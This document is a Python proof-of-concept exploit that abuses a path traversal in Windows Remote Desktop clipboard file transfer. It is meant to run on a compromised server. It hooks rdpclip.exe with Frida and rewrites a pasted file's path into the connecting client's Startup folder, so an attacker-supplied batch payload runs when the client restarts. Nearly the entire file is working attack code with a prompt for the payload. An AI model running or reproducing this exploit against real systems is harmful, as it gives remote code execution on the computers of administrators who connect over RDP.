# -*- coding: utf-8 -*-
# POC of mstsc.exe path traversal to RCE, could be easily modified to not to be used only by Administrator account as client. This script should be used on compromised server, then connect to it with mstsc.exe running with Administrator account. Nevertheless the account on destination compromised server could be anyone. The payload will be placed on STARTUP folder, when the client computer restart the payload will be executed. @0xedh.

from __future__ import print_function
import frida
import sys
import os
import ctypes
from ctypes import wintypes
import pythoncom
import win32clipboard
import psutil
import time
from threading import Thread
import win32con



class DROPFILES(ctypes.Structure):
    _fields_ = (('pFiles', wintypes.DWORD),
                ('pt',     wintypes.POINT),
                ('fNC',    wintypes.BOOL),
                ('fWide',  wintypes.BOOL))

def clip_files(file_list):
    offset = ctypes.sizeof(DROPFILES)
    length = sum(len(p) + 1 for p in file_list) + 1
    size = offset + length * ctypes.sizeof(ctypes.c_wchar)
    buf = (ctypes.c_char * size)()
    df = DROPFILES.from_buffer(buf)
    df.pFiles, df.fWide = offset, True
    for path in file_list:
        path = path.decode('gbk')
        array_t = ctypes.c_wchar * (len(path) + 1)
        path_buf = array_t.from_buffer(buf, offset)
        path_buf.value = path
        offset += ctypes.sizeof(path_buf)
    stg = pythoncom.STGMEDIUM()
    stg.set(pythoncom.TYMED_HGLOBAL, buf)
    win32clipboard.OpenClipboard()
    win32clipboard.EmptyClipboard()
    try:
        win32clipboard.SetClipboardData(win32clipboard.CF_HDROP, stg.data)
    finally:
        win32clipboard.CloseClipboard()

def copy_file_to_clipboard():
    clip_files(["C:\\Windows\Temp\\c.bat"])


def win32_clipboard_get():

    win32clipboard.OpenClipboard()
    try:
        text = win32clipboard.GetClipboardData(win32clipboard.CF_UNICODETEXT)
    except (TypeError, win32clipboard.error):
        try:
            text = win32clipboard.GetClipboardData(win32clipboard.CF_TEXT)
            text = py3compat.cast_unicode(text, py3compat.DEFAULT_ENCODING)
        except (TypeError, win32clipboard.error):
            try:
                text = win32clipboard.GetClipboardData(win32clipboard.CF_HDROP)
            except:
                pass

    finally:
        win32clipboard.CloseClipboard()
    return text 



def clipboardchanges():       
    recent_value = ""
    data = ""
    while True:

        #Monitoring clipboard
        try:
            data = win32_clipboard_get()
        except Exception:          
            pass
        tmp_value = data
        #Clipboard changing
        if tmp_value != recent_value:
            recent_value = tmp_value
            copy_file_to_clipboard()
            
				
        time.sleep(1)


def findProcessIdByName(processName):

    listOfProcessObjects = []

    for proc in psutil.process_iter():
       try:
           pinfo = proc.as_dict(attrs=['pid', 'name', 'create_time'])
           if processName.lower() in pinfo['name'].lower() :
               listOfProcessObjects.append(pinfo)
       except (psutil.NoSuchProcess, psutil.AccessDenied , psutil.ZombieProcess) :
           pass

    return listOfProcessObjects;


def on_message(message, data):
    print("[%s] => %s" % (message, data))

def fridahook(target_process):
    session = frida.attach(target_process)

    script = session.create_script("""
    var baseAddr = Module.findBaseAddress('KERNEL32.dll');
    console.log('KERNEL32.dll baseAddr: ' + baseAddr);
    var writefile = Module.findExportByName("KERNEL32.dll", "WriteFile");
    Interceptor.attach(ptr(writefile), {
    onEnter: function (args) {
        console.log("writefile()");
  
        this.buf = args[1];
        this.len = args[2].toInt32();
        console.log(this.buf);
        console.log(this.len);
        var bbuf = Memory.readByteArray(this.buf, this.len);
        console.log(hexdump(Memory.readByteArray(this.buf, this.len)));
        if(hexdump(Memory.readByteArray(this.buf, this.len)).includes("63 00 2e 00 62 00 61 00 74")) {
            console.log("-< FOUND CONTROLLED FILE, REPLACING >-");
            pathTraversalArray = [0x05,0x00,0x01,0x00,0x54,0x02,0x00,0x00,0x01,0x00,0x00,0x00,0x64,0x40,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x20,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x71,0x24,0xd8,0x40,0xf4,0xc9,0xd4,0x01,0x00,0x00,0x00,0x00,0xff,0x00,0x00,0x00,0x2e,0x00,0x2e,0x00,0x5c,0x00,0x2e,0x00,0x2e,0x00,0x5c,0x00,0x2e,0x00,0x2e,0x00,0x5c,0x00,0x2e,0x00,0x2e,0x00,0x5c,0x00,0x2e,0x00,0x2e,0x00,0x5c,0x00,0x2e,0x00,0x2e,0x00,0x5c,0x00,0x2e,0x00,0x2e,0x00,0x5c,0x00,0x50,0x00,0x72,0x00,0x6f,0x00,0x67,0x00,0x72,0x00,0x61,0x00,0x6d,0x00,0x44,0x00,0x61,0x00,0x74,0x00,0x61,0x00,0x5c,0x00,0x4d,0x00,0x69,0x00,0x63,0x00,0x72,0x00,0x6f,0x00,0x73,0x00,0x6f,0x00,0x66,0x00,0x74,0x00,0x5c,0x00,0x57,0x00,0x69,0x00,0x6e,0x00,0x64,0x00,0x6f,0x00,0x77,0x00,0x73,0x00,0x5c,0x00,0x53,0x00,0x74,0x00,0x61,0x00,0x72,0x00,0x74,0x00,0x20,0x00,0x4d,0x00,0x65,0x00,0x6e,0x00,0x75,0x00,0x5c,0x00,0x50,0x00,0x72,0x00,0x6f,0x00,0x67,0x00,0x72,0x00,0x61,0x00,0x6d,0x00,0x73,0x00,0x5c,0x00,0x53,0x00,0x74,0x00,0x61,0x00,0x72,0x00,0x74,0x00,0x55,0x00,0x70,0x00,0x5c,0x00,0x63,0x00,0x2e,0x00,0x62,0x00,0x61,0x00,0x74,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00]
            Memory.writeByteArray(this.buf, pathTraversalArray);
            console.log("-< REPLACED WITH PATH TRAVERSAL >-");
            console.log(hexdump(Memory.readByteArray(this.buf, this.len)));
        }
      }
    });
    """)

    script.on('message', on_message)
    script.load()
    sys.stdin.read()
    session.detach()
	
def waitforrdpclip():
    while True:
	
        listOfProcessIds = findProcessIdByName("rdpclip")
        if len(listOfProcessIds) > 0:
            for elem in listOfProcessIds:
                processID = elem['pid']
                processName = elem['name']
                print((processID ,processName))
			
                try:
                    target_process = int(processID)
                except ValueError:
                    target_process = processID
                
                Thread(target=clipboardchanges).start()
                Thread(target=fridahook(target_process)).start()

	    
        else:
            #Waiting for rdpclip.exe
            time.sleep(5)

	
def createfile():
    if os.path.exists("C:\\Windows\\Temp\\c.bat"):
        waitforrdpclip()
    else:
        file1 = open("C:\\Windows\\Temp\\c.bat", "w")
        payload = raw_input("Write your payload here: ")
        file1.write(payload)
        file1.close()
        waitforrdpclip()

if __name__ == '__main__':
    createfile()
